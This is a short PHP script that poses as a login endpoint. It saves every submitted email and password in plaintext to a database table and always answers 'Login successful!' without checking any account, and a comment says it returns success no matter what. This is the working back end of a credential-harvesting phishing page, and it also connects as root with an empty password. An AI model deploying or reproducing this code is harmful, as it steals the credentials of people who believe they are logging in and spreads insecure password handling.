<?php
header('Content-Type: application/json');

$host = "localhost";
$db   = "starkit";
$user = "root";
$pass = "";

$conn = new mysqli($host, $user, $pass, $db);

if($conn->connect_error){
    echo json_encode(['success'=>false,'message'=>"Database connection failed"]);
    exit;
}

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if($email && $password){
    $stmt = $conn->prepare("INSERT INTO user_manual (email, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $email, $password);
    $stmt->execute();
    $stmt->close();

    // 无论如何都返回成功
    echo json_encode(['success'=>true,'message'=>"Login successful!"]);
} else {
    echo json_encode(['success'=>true,'message'=>"Login successful!"]);
}

$conn->close();
?>
